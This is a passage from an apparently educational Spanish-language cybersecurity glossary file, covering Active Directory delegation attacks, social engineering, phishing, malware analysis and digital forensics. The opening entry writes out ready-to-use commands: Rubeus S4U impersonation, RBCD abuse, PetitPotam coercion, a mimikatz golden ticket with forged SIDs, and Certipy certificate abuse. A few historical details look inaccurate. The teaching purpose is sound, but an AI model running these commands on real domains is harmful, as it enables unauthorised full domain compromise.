      "\n**Kerberos Delegation types:**\n\n**Unconstrained Delegation (dangerous, deprecated post-2019):**\nUn service account con este privilege puede impersonate any user que se autentique contra él. Al recibir un TGT del user, el server lo almacena en memoria — dump con mimikatz → forge tickets.\n\n**Enumerate:**\n```powershell\n# BloodHound: query 'Find computers with unconstrained delegation'\n\n# LDAP filter\n(userAccountControl:1.2.840.113556.1.4.803:=524288)\n\n# PowerView\nGet-DomainComputer -Unconstrained\n```\n\n**Exploit:** coerce a Domain Admin (o DC) a autenticarse hacia el server con delegation → dump memoria → obtener TGT del DA.\n\n**Constrained Delegation (Microsoft KerbCon, 2003):**\nService puede impersonate users **solo hacia specific services** listed en su `msDS-AllowedToDelegateTo`. Más seguro pero abusable.\n\n**Enumerate:**\n```powershell\n# BloodHound: 'Find principals with constrained delegation'\n# PowerView\nGet-DomainUser -TrustedToAuth\n```\n\n**Exploit — Rubeus S4U:**\nSi controlás service account A con constrained delegation a service HTTP/target.corp.local:\n```\nRubeus.exe s4u /user:svcaccount$ /rc4:HASH /impersonateuser:Administrator /msdsspn:HTTP/target.corp.local /ptt\n# Ahora tenés un ticket como Administrator para HTTP en target\n```\n\n**Resource-Based Constrained Delegation (RBCD, 2012):**\nLa víctima define quién puede delegar hacia ELLA (en `msDS-AllowedToActOnBehalfOfOtherIdentity`). Popular en clouds/APIs.\n\n**Abuse (Elad Shamir 2019):**\nSi controlás ANY object con SPN, y podés escribir a `msDS-AllowedToActOnBehalfOfOtherIdentity` del target, → arbitrary user impersonation.\n\n```powershell\n# 1. Add computer con SPN (default hasta MS-DS-Machine-Account-Quota=10)\n# Cualquier user puede añadir hasta 10 computers al dominio (default)\nPowermad's New-MachineAccount -MachineAccount 'attackercomp$'\n\n# 2. Modify target's msDS-AllowedToActOnBehalfOfOtherIdentity → attackercomp$\nSet-ADComputer target -PrincipalsAllowedToDelegateToAccount attackercomp$\n\n# 3. S4U attack: attackercomp$ requests TGS for target impersonating any user\nRubeus.exe s4u /user:attackercomp$ /rc4:HASH_ATTACKER /impersonateuser:Administrator /msdsspn:CIFS/target /ptt\n```\n\n**Coercion attacks (para trigger delegation):**\n\n**PetitPotam (2021):**\nForzar Windows Server (incluyendo DC) a autenticarse a un attacker-controlled IP via MS-EFSRPC:\n```bash\nPetitPotam.py -u user -p pass 10.0.0.1 dc.corp.local  # DC autentica hacia 10.0.0.1\n```\n\n**PrinterBug / SpoolSample:**\nSimilar via Print Spooler (MS-RPRN). Usa `SpoolSample.exe`.\n\n**DFSCoerce:**\nVia DFS-R (Distributed File System Replication).\n\n**Chain típico:**\n1. PetitPotam contra DC → autentica hacia el server que control  \n2. Ese server tiene Unconstrained Delegation → captura el TGT del DC\n3. Golden Ticket forge con krbtgt hash from the DC\n4. Full domain compromise\n\n**Cross-forest trusts:**\n\n**Trust types:**\n• **Two-way transitive** — bidireccional entre parent + child (default AD forest)\n• **External trust** — non-transitive, entre forests separados\n• **Forest trust** — transitive entre forests\n• **Selective authentication** — más restrictivo (por default cierra escalada)\n\n**SID History abuse:**\nAl migrar users entre dominios (Microsoft ADMT), Windows guarda el SID original en `sIDHistory`. Un attacker con DA en dominio A puede injectar SIDs de dominio B → si trust no filtra SIDs, escalada cross-domain.\n\n```powershell\n# mimikatz con DA de dominio A\nmimikatz # kerberos::golden /user:Administrator /domain:trustee.local /sid:SID_TRUSTEE /krbtgt:HASH /sids:SID_ENT_ADMINS_OF_TRUSTED /ptt\n# Golden Ticket con SIDs de Enterprise Admins del OTRO forest\n```\n\n**SID Filtering** (habilitado por default en forest trusts modernas) mitiga esto, pero muchos legacy trusts lo tienen deshabilitado.\n\n**BloodHound cross-forest analysis:**\n```cypher\n// Shortest path desde un user del dominio A a un asset del dominio B\nMATCH p = shortestPath((u:User {domain:'A.LOCAL'})-[*1..]->(g:Group {name:'ENTERPRISE ADMINS@B.LOCAL'}))\nRETURN p\n```\n\n**Certified Pre-Owned (SpecterOps, 2021):**\nAttacks contra AD Certificate Services. **ESC1-ESC15** — misconfigs cataloged that lead to persistence + escalation. **ESC1** (Enrollee Supplies Subject) es más común — cualquier user puede request cert as anyone else.\n\n**Herramienta:** `Certipy` (Linux/Python) y `Certify` (Windows/C#).\n```bash\ncertipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable\ncertipy req -template VulnTemplate -upn administrator@corp.local -u user@corp.local -p pass\n# Obtienes cert as Administrator → autenticación PKINIT → TGT → shell\n```\n\n**Contramedidas:**\n• **Deshabilitar Unconstrained Delegation** — no la uses; migrar a RBCD.\n• **Protected Users group** — TGT lifetime shorter, no delegation.\n• **MS-DS-Machine-Account-Quota = 0** — evita user creation de computer accounts (fix RBCD abuse).\n• **SID Filtering** en todos los trusts.\n• **Selective authentication** en cross-forest trusts.\n• **AD CS hardening** — no `Enrollee Supplies Subject`, cert manager approval requerido.\n• **Kerberos AES-only** — dificulta hash cracking.\n> 💡 **BloodHound + ADCS module (Certipy)** son las tools moderna para cross-forest attack path analysis.\n> ⚠️ Legacy Windows environments (pre-2019) tienen delegation misconfigs everywhere. Golden path de red team engagement mid-market.",
    examples: [
      "Certified Pre-Owned (SpecterOps 2021): 15 técnicas de escalation via AD CS, altamente impactante.",
      "PetitPotam (2021): coercion + unconstrained → DC compromise en < 5 minutos.",
      "M&A escenarios: cross-forest trusts sin SID filtering permiten escalada horizontal.",
    ],
    related: ["Ataques a Active Directory", "Silver, Golden, Diamond y Sapphire tickets", "DCSync, DCShadow y DPAPI dumping", "LDAP enumeration y BloodHound"],
  },

  // ── M34 · Ingeniería Social ──────────────────────────────────────────────
  {
    id: 370,
    module: 34,
    term: "Ingeniería social",
    short: "El 'hackeo humano': manipular a las personas para que rompan la seguridad.",
    detail:
      "La **ingeniería social** explota la psicología en vez de la tecnología: engaña a las personas para que revelen información, hagan clic o concedan acceso. Es el vector de **la mayoría de las brechas**, porque las personas suelen ser más fáciles de manipular que los sistemas de parchear.\n" +
      "> 💡 Por eso la **concienciación** del personal es uno de los controles con mejor relación coste/beneficio.",
    examples: [
      "Una llamada haciéndose pasar por soporte técnico para pedir la contraseña.",
      "Un correo urgente del 'CEO' pidiendo una transferencia.",
    ],
    related: ["Los 6 principios de Cialdini", "Pretexting", "Anatomía de un phishing"],
  },
  {
    id: 371,
    module: 34,
    term: "Los 6 principios de Cialdini",
    short: "Los gatillos psicológicos de la persuasión que todo ingeniero social explota.",
    detail:
      "Robert Cialdini identificó **6 principios** de influencia; el atacante los usa como ganchos:\n" +
      "| Principio | Gancho que explota |\n" +
      "|---|---|\n" +
      "| Reciprocidad | Devolver un favor recibido |\n" +
      "| Compromiso/coherencia | Ser consistente con lo ya dicho |\n" +
      "| Prueba social | Hacer lo que hacen los demás |\n" +
      "| Autoridad | Obedecer a una figura de poder |\n" +
      "| Simpatía | Confiar en quien nos cae bien |\n" +
      "| Escasez | Actuar por miedo a perder algo |\n" +
      "> 💡 Ver el diagrama 'Los 6 principios de Cialdini' más abajo con la defensa de cada uno.",
    examples: [
      "Autoridad: un correo del 'director de IT' exigiendo acción.",
      "Escasez: 'tu cuenta se cerrará en 24 h, verifica ya'.",
    ],
    related: ["Ingeniería social", "Pretexting", "Anatomía de un phishing"],
  },
  {
    id: 372,
    module: 34,
    term: "Pretexting",
    short: "Inventar un escenario creíble (un pretexto) para ganarse la confianza y sonsacar datos.",
    detail:
      "El **pretexting** construye una **historia falsa** y una identidad (soporte técnico, banco, auditor) para que la víctima coopere. A diferencia del phishing oportunista, es **dirigido y elaborado**, apoyado en OSINT previo para sonar legítimo.",
    examples: [
      "Hacerse pasar por el proveedor de internet para 'verificar' la red.",
      "Fingir ser un empleado nuevo que necesita acceso 'urgente'.",
    ],
    related: ["Ingeniería social", "Vishing y smishing", "Los 6 principios de Cialdini"],
  },
  {
    id: 373,
    module: 34,
    term: "Baiting, tailgating y dumpster diving",
    short: "Técnicas que combinan cebo, acceso físico y basura para comprometer a la víctima.",
    detail:
      "Tres técnicas clásicas, varias con componente **físico**:\n" +
      "• **Baiting** — dejar un cebo (un USB 'perdido' con malware) para que alguien lo conecte por curiosidad.\n" +
      "• **Tailgating** (*piggybacking*) — colarse a una zona restringida siguiendo a alguien con acceso.\n" +
      "• **Dumpster diving** — buscar información sensible en la basura (papeles, discos).",
    examples: [
      "Un USB con etiqueta 'Salarios 2024' abandonado en el parking.",
      "Entrar tras un empleado cargando cajas para que te abra la puerta.",
    ],
    related: ["Ingeniería social", "Pretexting", "Reconocimiento pasivo vs activo"],
  },
  {
    id: 374,
    module: 34,
    term: "Vishing y smishing",
    short: "Ingeniería social por canales de voz (vishing) y SMS (smishing).",
    detail:
      "El engaño no vive solo en el correo:\n" +
      "• **Vishing** — *voice phishing*: llamadas que suplantan al banco, soporte o un directivo (hoy potenciado con **clonación de voz por IA**).\n" +
      "• **Smishing** — *SMS phishing*: mensajes con enlaces maliciosos (falsa entrega de paquete, alerta bancaria).\n" +
      "> ⚠️ El **hackeo de Twitter (2020)** empezó con un **vishing** a empleados.",
    examples: [
      "Una llamada 'del banco' pidiendo el código de verificación.",
      "Un SMS de 'tu paquete está retenido, paga aquí'.",
    ],
    related: ["Pretexting", "Ingeniería social", "Anatomía de un phishing"],
  },
  {
    id: 375,
    module: 34,
    term: "SET (Social-Engineer Toolkit)",
    short: "El framework de referencia para automatizar ataques de ingeniería social.",
    detail:
      "El **SET** (*Social-Engineer Toolkit*) automatiza vectores de ingeniería social: **clonado de páginas** de login para robo de credenciales, generación de payloads, campañas de spear phishing. Es una herramienta de **red team / concienciación** autorizada.\n" +
      "> ⚠️ Como toda herramienta ofensiva: solo con autorización explícita.",
    examples: [
      "Clonar un portal de login para una prueba de phishing interna.",
      "Generar un vector de ataque para una campaña de awareness.",
    ],
    related: ["Ingeniería social", "GoPhish y campañas controladas", "Anatomía de un phishing"],
  },

  // ── M35 · Phishing Avanzado ──────────────────────────────────────────────
  {
    id: 380,
    module: 35,
    term: "Anatomía de un phishing",
    short: "Las señales que delatan un correo fraudulento, capa por capa.",
    detail:
      "Un phishing combina **pretexto + urgencia + un enlace/adjunto**. Señales de alerta:\n" +
      "| Señal | Ejemplo |\n" +
      "|---|---|\n" +
      "| Remitente sospechoso | Dominio parecido pero no idéntico |\n" +
      "| Urgencia/amenaza | 'Tu cuenta será suspendida' |\n" +
      "| Enlace engañoso | El texto dice una URL, apunta a otra |\n" +
      "| Adjunto inesperado | Factura.zip / .html |\n" +
      "> 💡 Pasar el cursor sobre el enlace (sin hacer clic) revela el destino real.",
    examples: [
      "Un 'reset de contraseña' que enlaza a un dominio lookalike.",
      "Un adjunto HTML que abre un portal de login falso local.",
    ],
    related: ["Spear phishing y whaling", "Evasión de filtros", "Los 6 principios de Cialdini"],
  },
  {
    id: 381,
    module: 35,
    term: "Spear phishing y whaling",
    short: "Phishing dirigido a una persona concreta (spear) o a un alto directivo (whaling).",
    detail:
      "Frente al phishing masivo, el **dirigido** es mucho más efectivo:\n" +
      "• **Spear phishing** — personalizado con OSINT (nombre, rol, proyectos) para una víctima específica.\n" +
      "• **Whaling** — *spear phishing* contra un 'pez gordo' (CEO, CFO), donde el premio es máximo.\n" +
      "> ⚠️ El compromiso de **RSA (2011)** comenzó con un spear phishing con un Excel malicioso.",
    examples: [
      "Un correo al CFO que cita un trato real de la empresa (whaling).",
      "Spear phishing a un admin de sistemas citando su última conferencia.",
    ],
    related: ["Anatomía de un phishing", "BEC (Business Email Compromise)", "Frameworks OSINT"],
  },
  {
    id: 382,
    module: 35,
    term: "BEC (Business Email Compromise)",
    short: "Fraude que suplanta a un ejecutivo o proveedor para desviar pagos.",
    detail:
      "El **BEC** suplanta (o compromete) la cuenta de un directivo o proveedor para ordenar **transferencias** o cambiar datos bancarios. No suele llevar malware —solo texto convincente y urgencia— lo que lo hace difícil de filtrar. Es de los fraudes **más costosos** según el FBI.",
    examples: [
      "Un 'CEO' pidiendo una transferencia urgente y confidencial.",
      "Un 'proveedor' que avisa de un cambio en su número de cuenta.",
    ],
    related: ["Spear phishing y whaling", "Anatomía de un phishing", "Ingeniería social"],
  },
  {
    id: 383,
    module: 35,
    term: "GoPhish y campañas controladas",
    short: "Plataforma para lanzar simulacros de phishing y medir la concienciación.",
    detail:
      "**GoPhish** es un framework open source para **campañas de phishing autorizadas** (awareness/red team): diseña plantillas, envía a grupos y mide quién abrió, hizo clic o entregó credenciales. Convierte la concienciación en **métricas accionables**.\n" +
      "> 💡 Un programa de awareness mide la tasa de clic a lo largo del tiempo para ver si baja con la formación.",
    examples: [
      "Un simulacro trimestral que reporta el % de clics por departamento.",
      "Plantillas que imitan al proveedor de correo de la empresa.",
    ],
    related: ["SET (Social-Engineer Toolkit)", "Anatomía de un phishing", "Defensas anti-phishing"],
  },
  {
    id: 384,
    module: 35,
    term: "Evasión de filtros",
    short: "Trucos para que el correo malicioso llegue a la bandeja de entrada.",
    detail:
      "Para sortear los filtros, los atacantes usan: **dominios lookalike** (rnicrosoft.com), **typosquatting**, redirecciones y acortadores, payloads en **HTML/QR** en vez de enlaces, y abusar de servicios legítimos (Google Forms). También intentan pasar **SPF/DKIM/DMARC** usando dominios recién registrados o mal protegidos.\n" +
      "> 💡 Defensa: **DMARC** en modo *reject* corta la suplantación de tu dominio.",
    examples: [
      "Usar rnicrosoft.com (rn≈m) para imitar microsoft.com.",
      "Un QR en el cuerpo que lleva al portal falso (quishing).",
    ],
    related: ["Defensas anti-phishing", "Anatomía de un phishing", "DNS"],
  },
  {
    id: 385,
    module: 35,
    term: "Defensas anti-phishing",
    short: "Capas técnicas y humanas que reducen el éxito del phishing.",
    detail:
      "Ninguna capa basta sola; se combinan:\n" +
      "• **Autenticación de correo** — SPF, DKIM y **DMARC** (reject) contra la suplantación.\n" +
      "• **MFA** — limita el daño de una credencial robada (idealmente resistente a phishing, FIDO2).\n" +
      "• **Filtrado** — gateways de correo, sandboxing de adjuntos, reescritura de URLs.\n" +
      "• **Concienciación** — formación y simulacros (GoPhish).\n" +
      "> ✅ La **MFA FIDO2/passkeys** es resistente al phishing porque está ligada al dominio.",
    examples: [
      "DMARC en reject + MFA en todas las cuentas.",
      "Botón 'reportar phishing' que alimenta al SOC.",
    ],
    related: ["Evasión de filtros", "GoPhish y campañas controladas", "Headers de seguridad"],
  },

  // ── M36 · Malware Analysis: Fundamentos ──────────────────────────────────
  {
    id: 390,
    module: 36,
    term: "Clasificación de malware",
    short: "El malware se categoriza por cómo se propaga y qué hace.",
    detail:
      "**Malware** = software malicioso. Tipos principales:\n" +
      "| Tipo | Característica |\n" +
      "|---|---|\n" +
      "| Virus | Se adjunta a un archivo y necesita ejecución |\n" +
      "| Gusano (worm) | Se propaga solo por la red |\n" +
      "| Troyano | Se disfraza de software legítimo |\n" +
      "| Ransomware | Cifra datos y exige rescate |\n" +
      "| RAT | Acceso remoto encubierto |\n" +
      "| Rootkit | Se oculta a nivel profundo del SO |\n" +
      "> 💡 Una muestra real suele combinar categorías (ej. un troyano que instala un RAT).",
    examples: [
      "WannaCry fue ransomware con capacidad de gusano.",
      "Un RAT da control remoto del equipo de la víctima.",
    ],
    related: ["Análisis en sandbox", "Indicadores de compromiso (IoC)", "Reglas YARA"],
  },
  {
    id: 391,
    module: 36,
    term: "Análisis en sandbox",
    short: "Ejecutar una muestra en un entorno aislado para observar su comportamiento sin riesgo.",
    detail:
      "Un **sandbox** es un entorno **aislado y desechable** (VM sin red real o con red simulada) donde detonar el malware y observar qué hace: archivos creados, claves de registro, conexiones de red. Servicios como **Cuckoo**, **Any.Run** o **Joe Sandbox** automatizan el reporte.\n" +
      "> ⚠️ El malware moderno detecta sandboxes (anti-VM/anti-análisis) y se 'duerme' para evadir el análisis.",
    examples: [
      "Subir una muestra a Any.Run y ver sus llamadas de red.",
      "Un snapshot de VM para revertir tras cada ejecución.",
    ],
    related: ["Clasificación de malware", "Análisis dinámico", "Indicadores de compromiso (IoC)"],
  },
  {
    id: 392,
    module: 36,
    term: "Indicadores de compromiso (IoC)",
    short: "Artefactos observables que delatan la presencia de un malware concreto.",
    detail:
      "Un **IoC** es una huella que prueba una infección: **hashes** del binario, **IPs/dominios de C2**, nombres de archivos, claves de registro, mutexes. Se comparten en feeds de **threat intelligence** (MISP, STIX/TAXII) para que otros detecten la misma amenaza.\n" +
      "> 💡 Los IoC son fáciles de cambiar para el atacante; por eso se complementan con detección por **comportamiento/TTP** (ver la Pirámide del Dolor).",
    examples: [
      "El hash SHA-256 de una muestra en VirusTotal.",
      "Un dominio de C2 añadido a la lista de bloqueo del firewall.",
    ],
    related: ["Reglas YARA", "Threat intelligence"],
  },
  {
    id: 393,
    module: 36,
    term: "Reglas YARA",
    short: "El 'lenguaje de patrones' para identificar y clasificar familias de malware.",
    detail:
      "**YARA** describe reglas que buscan **patrones** (strings, bytes, condiciones) en archivos o memoria para detectar y **clasificar familias** de malware.\n" +
      "rule EjemploMalware {\n" +
      "  strings: $a = \"cmd.exe /c\" $b = { 6A 40 68 00 30 }\n" +
      "  condition: $a and $b\n" +
      "}\n" +
      "> 💡 Es el puente entre el análisis de una muestra y la detección masiva en el parque.",
    examples: [
      "Una regla YARA que caza una familia por sus strings únicos.",
      "Escanear memoria con YARA para hallar inyecciones.",
    ],
    related: ["Indicadores de compromiso (IoC)", "Análisis estático", "Threat intelligence"],
  },
  {
    id: 394,
    module: 36,
    term: "Threat intelligence",
    short: "Conocimiento sobre adversarios y amenazas que contextualiza la defensa.",
    detail:
      "La **threat intelligence** (CTI) convierte datos sueltos (IoCs, TTPs, campañas) en **conocimiento accionable**: quién ataca, cómo y qué buscar. Se mapea a **MITRE ATT&CK** y se comparte en formatos como **STIX/TAXII** o plataformas como **MISP**.",
    examples: [
      "Atribuir una muestra a un grupo APT por sus TTPs.",
      "Enriquecer una alerta del SOC con contexto de CTI.",
    ],
    related: ["Indicadores de compromiso (IoC)", "MITRE ATT&CK", "TTP (Tácticas, Técnicas y Procedimientos)"],
  },

  // ── M37 · Malware: Análisis Estático ─────────────────────────────────────
  {
    id: 400,
    module: 37,
    term: "Análisis estático",
    short: "Examinar el binario sin ejecutarlo, para inferir qué hace.",
    detail:
      "El **análisis estático** inspecciona la muestra **sin correrla**: strings, cabeceras, importaciones, disassembly. Es **seguro** (no detona) y rápido para un primer triage, aunque la ofuscación/empaquetado lo dificulta.\n" +
      "> 💡 Se combina con el dinámico: el estático dice 'qué podría hacer', el dinámico confirma 'qué hace'.",
    examples: [
      "Listar las APIs importadas para inferir capacidades.",
      "Sacar el hash y buscarlo en VirusTotal antes de nada.",
    ],
    related: ["Strings y hashing", "Cabeceras PE", "Ghidra e IDA"],
  },
  {
    id: 401,
    module: 37,
    term: "Strings y hashing",
    short: "Las cadenas de texto y el hash son el primer vistazo a una muestra.",
    detail:
      "• **Hashing** — `md5/sha256` identifican unívocamente la muestra y permiten buscarla en feeds (VirusTotal).\n" +
      "• **Strings** — extraer el texto legible revela URLs, rutas, comandos, mensajes de ransomware.\n" +
      "strings -n 8 muestra.exe\n" +
      "> ⚠️ Pocos strings útiles suele indicar **empaquetado/ofuscación**.",
    examples: [
      "strings revelando un dominio de C2 hardcodeado.",
      "Buscar el SHA-256 en VirusTotal para ver detecciones.",
    ],
    related: ["Análisis estático", "Cabeceras PE", "Unpacking y deofuscación"],
  },
  {
    id: 402,
    module: 37,
    term: "Cabeceras PE",
    short: "La estructura del ejecutable de Windows revela mucho sobre la muestra.",
    detail:
      "El formato **PE** (*Portable Executable*) de Windows tiene cabeceras y **secciones** (.text, .data, .rsrc) e una **tabla de importaciones (IAT)** que lista las APIs que usa. Analizarlas (con `pefile`, PE-bid, CFF Explorer) delata capacidades: red, cifrado, inyección.\n" +
      "> 💡 Una entropía alta en una sección sugiere datos cifrados/empaquetados.",
    examples: [
      "Ver imports como WININET o CryptEncrypt para inferir comportamiento.",
      "Una marca de tiempo de compilación que ayuda a la atribución.",
    ],
    related: ["Strings y hashing", "Análisis estático", "Unpacking y deofuscación"],
  },
  {
    id: 403,
    module: 37,
    term: "Ghidra e IDA",
    short: "Desensambladores/decompiladores para leer la lógica del malware.",
    detail:
      "Cuando los strings no bastan, se **desensambla**: **Ghidra** (gratis, de la NSA) e **IDA** convierten el binario a ensamblador y a **pseudo-C** (decompilación), permitiendo seguir la lógica real (rutinas de cifrado, C2, anti-análisis). Es la parte más técnica del análisis estático.",
    examples: [
      "Decompilar en Ghidra la rutina que descifra la config del C2.",
      "Seguir en IDA el flujo de un dropper.",
    ],
    related: ["Cabeceras PE", "Unpacking y deofuscación", "Análisis estático"],
  },
  {
    id: 404,
    module: 37,
    term: "Unpacking y deofuscación",
    short: "Revertir el empaquetado/ofuscación que el malware usa para esconderse.",
    detail:
      "Los **packers** (UPX, Themida) comprimen/cifran el binario para evadir AV y dificultar el análisis; el malware se **desempaqueta solo** en memoria al ejecutarse. El analista debe **unpack** (a veces con `upx -d`, a veces dumpeando de memoria) y **deofuscar** strings antes de poder leer el código real.\n" +
      "upx -d muestra.exe",
    examples: [
      "upx -d para un binario empaquetado con UPX estándar.",
      "Dumpear el proceso desde memoria para obtener el código desempaquetado.",
    ],
    related: ["Ghidra e IDA", "Cabeceras PE", "Análisis dinámico"],
  },

  // ── M38 · Malware: Análisis Dinámico ─────────────────────────────────────
  {
    id: 410,
    module: 38,
    term: "Análisis dinámico",
    short: "Ejecutar la muestra de forma controlada para ver su comportamiento real.",
    detail:
      "El **análisis dinámico** detona el malware en un entorno **monitorizado y aislado** para observar lo que el estático no muestra (por ofuscación): qué archivos toca, qué procesos crea, con quién habla. Requiere un **laboratorio seguro**: VM aislada, snapshots y, a menudo, red simulada (INetSim).\n" +
      "> ⚠️ Nunca analizar malware en una máquina con acceso a la red real o a datos sensibles.",
    examples: [
      "Detonar en una VM y observar la creación de persistencia.",
      "Usar INetSim para falsear Internet y capturar el C2.",
    ],
    related: ["Process Monitor y Regshot", "Callbacks de red (C2)", "Análisis en sandbox"],
  },
  {
    id: 411,
    module: 38,
    term: "Process Monitor y Regshot",
    short: "Herramientas que registran los cambios que el malware hace en el sistema.",
    detail:
      "Para capturar el comportamiento se usan:\n" +
      "• **Process Monitor (ProcMon)** — registra en vivo accesos a archivos, registro, procesos y red.\n" +
      "• **Regshot** — toma un snapshot del registro/archivos antes y después y **compara** (diff) para ver qué cambió.\n" +
      "• **Procmon + Process Explorer** — para árbol de procesos y handles.\n" +
      "> 💡 El diff de Regshot revela rápido las claves de persistencia creadas.",
    examples: [
      "ProcMon mostrando la clave Run que el malware añade.",
      "Regshot diff revelando los archivos soltados.",
    ],
    related: ["Análisis dinámico", "Callbacks de red (C2)", "Registro de Windows"],
  },
  {
    id: 412,
    module: 38,
    term: "Callbacks de red (C2)",
    short: "Observar con quién se comunica el malware revela su infraestructura de control.",
    detail:
      "Casi todo malware **llama a casa** (C2) para recibir órdenes o exfiltrar. Capturando el tráfico (**Wireshark**, **INetSim**, **FakeNet**) se obtienen **dominios/IPs de C2**, el patrón de **beaconing** y el protocolo. Son IoCs valiosos y a menudo el objetivo del análisis.",
    examples: [
      "Wireshark capturando el beacon periódico al C2.",
      "FakeNet respondiendo al malware para provocar su siguiente fase.",
    ],
    related: ["Análisis dinámico", "Indicadores de compromiso (IoC)", "Detección de anomalías en tráfico"],
  },
  {
    id: 413,
    module: 38,
    term: "API hooking y forense de memoria",
    short: "Técnicas avanzadas para observar el malware en ejecución y en la RAM.",
    detail:
      "Para muestras evasivas se va más profundo:\n" +
      "• **API hooking** — interceptar las llamadas a la API de Windows que hace el malware para registrar su actividad real.\n" +
      "• **Forense de memoria** — con **Volatility** se analiza un volcado de RAM para hallar inyecciones, procesos ocultos y código desempaquetado que no toca el disco.\n" +
      "> 💡 La memoria suele contener el código ya desempaquetado y la config del C2 en claro.",
    examples: [
      "Volatility detectando una inyección de proceso (malfind).",
      "Hooks de API que registran cada CreateFile del malware.",
    ],
    related: ["Análisis dinámico", "Unpacking y deofuscación", "Callbacks de red (C2)"],
  },

  // ── M39 · Forense Digital: Fundamentos ───────────────────────────────────
  {
    id: 420,
    module: 39,
    term: "Forense digital",
    short: "Recolectar, preservar y analizar evidencia digital de forma que sea válida legalmente.",
    detail:
      "La **forense digital** (DFIR) investiga incidentes y delitos a partir de **evidencia digital**, con dos exigencias clave: **integridad** (la evidencia no se altera) y **trazabilidad** (todo está documentado). El objetivo es reconstruir qué pasó de forma **defendible ante un tribunal**.\n" +
      "> 💡 La regla de oro: trabajar siempre sobre una **copia**, nunca sobre la evidencia original.",
    examples: [
      "Investigar un equipo comprometido tras un incidente.",
      "Reconstruir la línea de tiempo de una exfiltración de datos.",
    ],
    related: ["Cadena de custodia", "Adquisición de imagen", "Orden de volatilidad"],
  },
  {
    id: 421,
    module: 39,
    term: "Cadena de custodia",
    short: "El registro documentado de quién tocó la evidencia, cuándo y por qué.",
    detail:
      "La **cadena de custodia** documenta cada manipulación de la evidencia desde su recolección: quién la tomó, cuándo, dónde se guardó y quién accedió. Cualquier hueco la vuelve **inadmisible** en juicio. Se apoya en **hashes** para probar que la copia no cambió.\n" +
      "> ⚠️ Una cadena de custodia rota puede tirar abajo todo un caso, por sólida que sea la evidencia técnica.",
    examples: [
      "Un formulario firmado en cada transferencia de la evidencia.",
      "Sellar y etiquetar un disco incautado con su hash.",
    ],
    related: ["Forense digital", "Adquisición de imagen", "Consideraciones legales"],
  },
  {
    id: 422,
    module: 39,
    term: "Adquisición de imagen",
    short: "Copiar bit a bit el medio original sin alterarlo, verificando con hash.",
    detail:
      "La **adquisición** crea una **imagen forense**: una copia **bit a bit** (incluyendo espacio sin asignar) del medio. Se usa un **write blocker** para no modificar el original y se calcula el **hash antes y después** para probar que la copia es idéntica.\n" +
      "dd if=/dev/sda of=imagen.dd bs=4M conv=noerror,sync\n" +
      "sha256sum /dev/sda imagen.dd\n" +
      "> 💡 Formatos comunes: `dd` (raw) y **E01** (EnCase, con metadatos y compresión).",
    examples: [
      "Clonar un disco con un write blocker antes de analizarlo.",
      "Verificar que el hash del original y la imagen coinciden.",
    ],
    related: ["Cadena de custodia", "Orden de volatilidad", "Imagen y análisis de disco"],
  },
  {
    id: 423,
    module: 39,
    term: "Orden de volatilidad",
    short: "Capturar primero lo más efímero: la RAM se pierde al apagar; el disco no.",
    detail:
      "La evidencia tiene distinta **vida útil**. La **RFC 3227** ordena qué recolectar primero, del más volátil al más persistente: **registros/caché → RAM → estado de red/conexiones → disco → backups**.\n" +
      "> ⚠️ Apagar un equipo 'para preservarlo' **destruye** la RAM, que suele contener claves, procesos y malware sin tocar disco. Ver el diagrama 'Orden de volatilidad'.",
    examples: [
      "Volcar la RAM antes de apagar un servidor comprometido.",
      "Capturar las conexiones de red activas antes de desconectarlo.",
    ],
    related: ["Adquisición de imagen", "Forense de memoria (Volatility)", "Forense digital"],
  },
  {
    id: 424,
    module: 39,
    term: "Consideraciones legales",
    short: "Para que la evidencia sirva, debe ser admisible: legalmente obtenida y bien documentada.",
    detail:
      "El mejor análisis técnico es inútil si la evidencia es **inadmisible**. Importan: la **autorización** legal (orden, consentimiento), la **cadena de custodia** intacta, la **integridad** verificable (hashes) y la capacidad del perito de **testificar** y explicar su método. El analista debe ser **imparcial** y reproducible.",
    examples: [
      "Obtener la evidencia con la orden o autorización adecuada.",
      "Documentar el método para poder defenderlo en el estrado.",
    ],
    related: ["Cadena de custodia", "Forense digital", "Herramientas forenses"],
  },
  {
    id: 425,
    module: 39,
    term: "Herramientas forenses",
    short: "El instrumental del analista: imagen, análisis, memoria y red.",
    detail:
      "El kit forense combina suites y utilidades especializadas:\n" +
      "| Categoría | Herramientas |\n" +
      "|---|---|\n" +
      "| Adquisición | dd, FTK Imager, write blocker |\n" +
      "| Disco | Autopsy, FTK, The Sleuth Kit, EnCase |\n" +
      "| Memoria | Volatility |\n" +
      "| Red | Wireshark, NetworkMiner, Zeek |\n" +
      "> 💡 Las distros **SIFT** y **CAINE** empaquetan el arsenal forense listo para usar.",
    examples: [
      "FTK Imager para adquirir, Autopsy para analizar.",
      "Arrancar SIFT Workstation para una investigación.",
    ],
    related: ["Adquisición de imagen", "Imagen y análisis de disco", "Análisis de PCAP"],
  },

  // ── M40 · Forense: Disco y Memoria ───────────────────────────────────────
  {
    id: 430,
    module: 40,
    term: "Imagen y análisis de disco",
    short: "Examinar la imagen del disco para hallar archivos, artefactos y rastros del usuario.",
    detail:
      "Sobre la imagen forense se analiza el **sistema de archivos**: archivos y metadatos (MFT en NTFS), artefactos de actividad (historial, registro, prefetch, papelera). **Autopsy** (GUI de **The Sleuth Kit**) y **FTK** automatizan la indexación, búsqueda por palabras clave y extracción de artefactos.",
    examples: [
      "Autopsy listando los archivos recientes y descargas del usuario.",
      "Analizar la MFT para ver creación/modificación de archivos.",
    ],
    related: ["Recuperación de datos", "Análisis de timeline", "Herramientas forenses"],
  },
  {
    id: 431,
    module: 40,
    term: "Forense de memoria (Volatility)",
    short: "Analizar un volcado de RAM revela lo que el disco no: procesos, inyecciones y claves.",
    detail:
      "Un volcado de **RAM** captura el estado vivo del sistema. **Volatility** lo analiza para hallar **procesos** (incluso ocultos), conexiones de red, comandos, claves de cifrado y **código inyectado** que nunca tocó el disco.\n" +
      "vol.py -f memoria.raw windows.pslist\n" +
      "vol.py -f memoria.raw windows.malfind\n" +
      "> 💡 La memoria suele contener malware ya desempaquetado y config de C2 en claro.",
    examples: [
      "pslist/pstree para ver el árbol de procesos del volcado.",
      "malfind para detectar inyección de código en procesos.",
    ],
    related: ["Orden de volatilidad", "API hooking y forense de memoria", "Análisis de timeline"],
  },
  {
    id: 432,
    module: 40,
    term: "Análisis de timeline",
    short: "Ordenar todos los eventos por tiempo para reconstruir la secuencia del incidente.",
    detail:
